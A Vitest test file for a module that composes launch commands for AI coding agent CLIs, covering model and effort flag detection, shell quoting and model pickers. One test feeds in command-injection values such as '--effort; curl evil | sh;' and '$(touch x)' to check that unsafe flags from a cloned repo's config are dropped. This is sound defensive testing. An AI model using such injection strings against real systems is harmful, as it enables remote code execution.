import { describe, it, expect } from "vitest";
import {
  commandSpecifiesEffort,
  commandSpecifiesModel,
  composeEffort,
  composeLaunchCommand,
  effortOptions,
  effortPresets,
  mergeDiscoveredModels,
  modelOptions,
  modelIsCustom,
  CUSTOM_MODEL,
} from "$lib/agents/agentModel";

describe("commandSpecifiesModel", () => {
  it("finds the flag as a whole token, in every spelling", () => {
    expect(commandSpecifiesModel("claude --model opus", "--model")).toBe(true);
    expect(commandSpecifiesModel("claude --model=opus", "--model")).toBe(true);
    expect(commandSpecifiesModel("gemini -m gemini-flash-latest", "--model")).toBe(true);
    expect(commandSpecifiesModel("opencode -m=x", "--model")).toBe(true);
  });

  it("is not fooled by a substring", () => {
    // The bug a naive includes() would ship: a command that merely
    // CONTAINS the letters would suppress the flag entirely, and the
    // user's chosen model would silently never reach the agent.
    expect(commandSpecifiesModel("claude --modelling", "--model")).toBe(false);
    expect(commandSpecifiesModel("run --dry-model", "--model")).toBe(false);
    expect(commandSpecifiesModel("claude", "--model")).toBe(false);
  });

  it("says no when the profile has no flag at all", () => {
    expect(commandSpecifiesModel("cursor --model x", "")).toBe(false);
  });
});

describe("composeLaunchCommand", () => {
  it("appends the flag and the model", () => {
    expect(composeLaunchCommand("claude", "--model", "opus")).toBe("claude --model opus");
  });

  it("leaves the command alone when there is nothing to add", () => {
    expect(composeLaunchCommand("claude", "--model", "")).toBe("claude");
    expect(composeLaunchCommand("claude", "--model", "   ")).toBe("claude");
    expect(composeLaunchCommand("cursor", "", "opus")).toBe("cursor");
  });

  it("defers to a model the command already names", () => {
    // What the user typed by hand is the more specific statement of
    // intent, and two --model flags is an argv error, not a preference.
    expect(composeLaunchCommand("claude --model sonnet", "--model", "opus")).toBe(
      "claude --model sonnet"
    );
    expect(composeLaunchCommand("gemini -m x", "--model", "opus")).toBe("gemini -m x");
  });

  it("trims the model", () => {
    expect(composeLaunchCommand("claude", "--model", "  opus  ")).toBe("claude --model opus");
  });

  it("quotes a model a shell would read as something else", () => {
    // `[1m]` is a glob character class. Unquoted, and in a checkout that
    // happens to hold a file called `sonnetm`, /bin/sh hands the agent
    // `--model sonnetm` -- a model nobody chose, on one machine, with no
    // error anywhere.
    expect(composeLaunchCommand("claude", "--model", "sonnet[1m]")).toBe(
      "claude --model 'sonnet[1m]'"
    );
    expect(composeLaunchCommand("claude", "--model", "opus[1m]")).toBe(
      "claude --model 'opus[1m]'"
    );
  });

  it("leaves an ordinary name bare", () => {
    // The composed line is shown to the human in Settings, so quoting
    // what needs no quoting is noise. Every stable alias and every
    // `provider/model` opencode prints is inert as written.
    expect(composeLaunchCommand("claude", "--model", "opusplan")).toBe("claude --model opusplan");
    expect(composeLaunchCommand("gemini", "--model", "flash-lite")).toBe(
      "gemini --model flash-lite"
    );
    expect(composeLaunchCommand("opencode", "--model", "google/gemini-2.5-pro")).toBe(
      "opencode --model google/gemini-2.5-pro"
    );
  });

  it("survives a quote inside the name", () => {
    // Nothing legitimate spells a model this way; a hand-typed Custom
    // model is a text box, and a text box eventually gets a quote in it.
    expect(composeLaunchCommand("claude", "--model", "a'b")).toBe("claude --model 'a'\\''b'");
  });
});

describe("commandSpecifiesEffort", () => {
  it("finds a separated flag as a whole token", () => {
    expect(commandSpecifiesEffort("claude --effort high", "--effort")).toBe(true);
    expect(commandSpecifiesEffort("claude --effort=high", "--effort")).toBe(true);
    expect(commandSpecifiesEffort("claude --effortless", "--effort")).toBe(false);
  });

  it("looks for the KEY of an attached override, not the generic flag", () => {
    // `-c` is codex's override for ANY config key: a command that sets
    // the model through it has not chosen an effort.
    const flag = "-c model_reasoning_effort=";
    expect(commandSpecifiesEffort('codex -c model_reasoning_effort="high"', flag)).toBe(true);
    expect(commandSpecifiesEffort("codex --config model_reasoning_effort=low", flag)).toBe(true);
    expect(commandSpecifiesEffort('codex -c model="gpt-5"', flag)).toBe(false);
  });

  it("says no when there is no flag", () => {
    expect(commandSpecifiesEffort("claude --effort high", "")).toBe(false);
  });

  it("detects an existing env-assignment prefix, kimi's shape", () => {
    const flag = "KIMI_MODEL_THINKING_EFFORT=";
    expect(commandSpecifiesEffort("KIMI_MODEL_THINKING_EFFORT=low kimi", flag)).toBe(true);
    expect(commandSpecifiesEffort("KIMI_MODEL_THINKING_EFFORT='max' kimi -m kimi-code/k3", flag)).toBe(true);
    expect(commandSpecifiesEffort("kimi -m kimi-code/k3", flag)).toBe(false);
    // A same-named variable without a value is not an effort choice.
    expect(commandSpecifiesEffort("KIMI_MODEL_THINKING_EFFORT kimi", flag)).toBe(false);
  });
});

describe("composeEffort", () => {
  it("separates the level from a plain flag", () => {
    expect(composeEffort("claude --model opus", "--effort", "high")).toBe(
      "claude --model opus --effort high"
    );
  });

  it("attaches the level to a flag ending in =", () => {
    expect(composeEffort("codex", "-c model_reasoning_effort=", "xhigh")).toBe(
      "codex -c model_reasoning_effort=xhigh"
    );
  });

  it("prepends an env-assignment shape before the whole command", () => {
    // kimi's effort is `KIMI_MODEL_THINKING_EFFORT`, not an argv flag:
    // the launch composes through `sh -c`, so the prefix lands like one.
    expect(composeEffort("kimi", "KIMI_MODEL_THINKING_EFFORT=", "low")).toBe(
      "KIMI_MODEL_THINKING_EFFORT=low kimi"
    );
    expect(composeEffort("kimi -m kimi-code/k3", "KIMI_MODEL_THINKING_EFFORT=", "max")).toBe(
      "KIMI_MODEL_THINKING_EFFORT=max kimi -m kimi-code/k3"
    );
    // An effort the command already sets wins, same as the flag shapes.
    expect(composeEffort("KIMI_MODEL_THINKING_EFFORT=low kimi", "KIMI_MODEL_THINKING_EFFORT=", "max")).toBe(
      "KIMI_MODEL_THINKING_EFFORT=low kimi"
    );
    // A lowercase `-c key=` override is NOT the env shape: it keeps its
    // append meaning.
    expect(composeEffort("codex", "-c model_reasoning_effort=", "high")).toBe(
      "codex -c model_reasoning_effort=high"
    );
  });

  it("leaves the command alone when there is nothing to add", () => {
    expect(composeEffort("claude", "--effort", "")).toBe("claude");
    expect(composeEffort("gemini", "", "high")).toBe("gemini");
  });

  it("defers to an effort the command already sets", () => {
    expect(composeEffort("claude --effort low", "--effort", "max")).toBe("claude --effort low");
  });

  it("quotes a level a shell would read as something else, on either shape", () => {
    expect(composeEffort("my-agent", "--think", "very hard")).toBe("my-agent --think 'very hard'");
    expect(composeEffort("my-agent", "--think=", "a;b")).toBe("my-agent --think='a;b'");
  });

  it("drops a flag that is not inert rather than writing it into the command", () => {
    // `[agent] effort_flag` arrives in a cloned repo's config.toml, and a
    // flag is appended unquoted -- so one carrying shell syntax is never
    // composed at all.
    expect(composeEffort("claude", "--effort; curl evil | sh;", "high")).toBe("claude");
    expect(composeEffort("claude", "$(touch x)", "high")).toBe("claude");
  });
});

describe("effortOptions", () => {
  it("offers inherit, the CLI's levels, then Custom", () => {
    expect(
      effortOptions({ effortFlag: "--effort", efforts: ["low", "high"] }, "high").map((o) => o.label)
    ).toEqual(["Default (high)", "low", "high", "Custom…"]);
  });

  it("offers nothing for a profile with no effort flag", () => {
    expect(effortOptions({ effortFlag: "", efforts: [] }, "")).toEqual([]);
  });
});

describe("mergeDiscoveredModels", () => {
  const profiles = [
    { id: "claude-code", models: ["opus", "sonnet"] },
    { id: "opencode", models: [] as string[] },
  ];

  it("appends what the host discovered behind the verified aliases", () => {
    // Aliases lead because they cannot go stale; the discovered names
    // follow in the order the agent itself listed them.
    expect(mergeDiscoveredModels(profiles, { opencode: ["a/one", "b/two"] })).toEqual([
      { id: "claude-code", models: ["opus", "sonnet"] },
      { id: "opencode", models: ["a/one", "b/two"] },
    ]);
  });

  it("never lists a name twice", () => {
    expect(
      mergeDiscoveredModels(profiles, { "claude-code": ["sonnet", "claude-opus-5"] })[0].models
    ).toEqual(["opus", "sonnet", "claude-opus-5"]);
  });

  it("returns the very same rows when there is nothing to add", () => {
    // The bootstrap applies this unconditionally, and every consumer is
    // a Svelte store: a merge that rebuilt untouched rows would republish
    // the whole table for a catalogue that answered nothing.
    const catalogs: Record<string, string[]>[] = [
      {},
      { opencode: [] },
      { opencode: ["  "] },
      { nobody: ["x/y"] },
    ];
    for (const catalog of catalogs) {
      const merged = mergeDiscoveredModels(profiles, catalog);
      expect(merged[0]).toBe(profiles[0]);
      expect(merged[1]).toBe(profiles[1]);
    }
  });
});

describe("modelOptions", () => {
  const claude = { modelFlag: "--model", models: ["fable", "opus", "sonnet"] };
  const gemini = { modelFlag: "--model", models: [] };
  const cursor = { modelFlag: "", models: [] };

  it("leads with an inherit row that names what it inherits", () => {
    expect(modelOptions(claude, "opus")[0]).toEqual({ value: "", label: "Default (opus)" });
    expect(modelOptions(claude, "")[0]).toEqual({ value: "", label: "(unset)" });
  });

  it("offers every preset, then Custom", () => {
    expect(modelOptions(claude, "").map((o) => o.value)).toEqual([
      "",
      "fable",
      "opus",
      "sonnet",
      CUSTOM_MODEL,
    ]);
  });

  it("offers Custom alone for a profile with no presets", () => {
    expect(modelOptions(gemini, "").map((o) => o.value)).toEqual(["", CUSTOM_MODEL]);
  });

  it("offers nothing at all for a profile with no flag", () => {
    // The panel renders a hint instead: gavin has no verified way to put
    // a model on this command, so it must not pretend otherwise.
    expect(modelOptions(cursor, "")).toEqual([]);
  });
});

describe("modelIsCustom", () => {
  const presets = ["opus", "sonnet", "haiku"];

  it("is false while the workspace is on a preset, or on nothing", () => {
    expect(modelIsCustom(false, "opus", presets)).toBe(false);
    expect(modelIsCustom(false, "", presets)).toBe(false);
  });

  it("is true once the picker's Custom… row has been chosen", () => {
    expect(modelIsCustom(true, "opus", presets)).toBe(true);
    expect(modelIsCustom(true, "", presets)).toBe(true);
  });

  // The clause a picker alone would lose: a model typed here earlier, or
  // written into config.toml by hand, is not among the presets -- and
  // without this the picker would draw a preset as selected while the
  // workspace ran something else.
  it("is true for a stored model the profile does not offer", () => {
    expect(modelIsCustom(false, "sonnet[1m]", presets)).toBe(true);
  });

  // A profile with no presets at all: anything the workspace holds is
  // custom by definition.
  it("is true for any stored model when the profile offers none", () => {
    expect(modelIsCustom(false, "opus", [])).toBe(true);
    expect(modelIsCustom(false, "", [])).toBe(false);
  });
});

describe("effortPresets", () => {
  const profiles = [
    { id: "claude-code", efforts: ["low", "medium", "high", "xhigh", "max"] },
    { id: "codex", efforts: ["minimal", "low", "medium", "high", "xhigh"] },
    { id: "gemini", efforts: [] },
  ];

  it("offers a named profile its own levels", () => {
    expect(effortPresets(profiles, "codex")).toEqual(["minimal", "low", "medium", "high", "xhigh"]);
    expect(effortPresets(profiles, "gemini")).toEqual([]);
    expect(effortPresets(profiles, "gone")).toEqual([]);
  });

  it("offers an unnamed row every level any profile documents, once each", () => {
    expect(effortPresets(profiles, "")).toEqual(["low", "medium", "high", "xhigh", "max", "minimal"]);
  });
});
